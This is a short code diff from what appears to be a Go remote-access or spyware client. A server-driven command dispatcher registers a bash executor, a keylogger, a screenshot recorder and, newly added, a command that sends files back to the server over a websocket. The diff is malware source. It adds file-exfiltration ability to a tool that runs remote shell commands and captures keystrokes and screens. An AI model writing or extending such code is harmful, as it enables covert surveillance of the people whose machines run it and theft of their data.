@@ -26,11 +26,13 @@ func main() {
 	// Initialize Observer for processing incoming
 	// commands from server
 	screenrecorder := internal.NewScreenRecorder(5)
+	sendFileCmd := internal.NewSendFileCommand(wsc)
 
 	subject := &internal.Subject{}
 	subject.AddListener(internal.NewBashExecutorObserver())
 	subject.AddListener(internal.NewKeyloggerCmdObserver())
-	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, internal.NewSendFileCommand(wsc)))
+	subject.AddListener(internal.NewScreenshotCmdObserver(screenrecorder, sendFileCmd))
+	subject.AddListener(internal.NewSendFileCmdObserver(sendFileCmd))
 
 	// Start Communications
 	wsc.StartCommunications(subject)
